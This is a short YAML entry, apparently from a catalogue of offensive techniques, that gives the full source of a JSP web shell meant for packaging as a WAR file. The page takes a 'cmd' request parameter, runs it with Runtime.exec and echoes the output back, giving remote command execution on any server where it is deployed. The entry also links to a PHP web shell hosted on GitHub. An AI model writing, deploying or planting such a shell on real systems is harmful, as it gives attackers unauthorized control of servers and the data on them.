---
functions:
  shell:
    - description: war web shell (in jsp format)
      code: |
        <FORM METHOD=GET ACTION='shell.jsp'>
		<INPUT id='cmd' name='cmd' type=text>
		<INPUT type=submit value='Run'>
		</FORM>
		<script>
			var input = document.getElementById("cmd");
			input.focus();
			input.select();
		</script>

		<%@ page import="java.io.*" %>
		<%
		   String cmd = request.getParameter("cmd");
		   String output = "";
		   if(cmd != null) {
		      String s = null;
		      try {
		         Process p = Runtime.getRuntime().exec(cmd,null,null);
		         BufferedReader sI = new BufferedReader(new
		InputStreamReader(p.getInputStream()));
		         while((s = sI.readLine()) != null) { output += s+"</br>"; }
		      }  catch(IOException e) {   e.printStackTrace();   }
		   }
		%>
		<pre><%=output %></pre>
resources: |
  https://raw.githubusercontent.com/MidnightSeer/scripts/master/php_web_shell.php
---
